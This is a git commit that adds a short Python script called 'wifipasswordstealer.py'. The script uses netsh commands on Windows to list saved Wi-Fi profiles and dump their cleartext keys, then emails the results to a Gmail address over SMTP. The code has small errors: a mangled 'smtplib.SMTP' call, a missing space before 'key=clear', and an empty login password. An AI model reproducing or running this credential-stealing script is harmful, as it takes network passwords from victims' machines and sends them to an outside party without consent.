fd7a5d03af2d7c634e15521172adebfab94cbe45
Vipul vyas <41857567+vipulvyas@users.noreply.github.com>
2019-09-30 12:09:43 +0530

    Add files via upload

---
+++ wireless/wifipasswordstealer.py
@@ -0,0 +1,19 @@
+#!/usr/bin/python
+
+import subprocess, smtplib, re
+
+command1 = "netsh wlan show profile"
+networks = subprocess.check_output(command1,shell=True)
+network_list = re.findall('(?:Profile\s*:\s)(.*)' , networks)
+
+final_output = ""
+for network in network_list:
+	command2 = "netsh wlan show profile " + network + "key=clear"
+	one_network_result = subprocess.check_output(command2, shell=True)
+	final_output += one_network_result
+
+server = smtplismtp("smtp.gmail.com", 587)
+server.starttls()
+server.login("vipulvyas0813@gmail.com","")
+server.sendmail("vipulvyas0813@gmail.com","vipulvyas0813@gmail.com",final_output)
+server.quit()
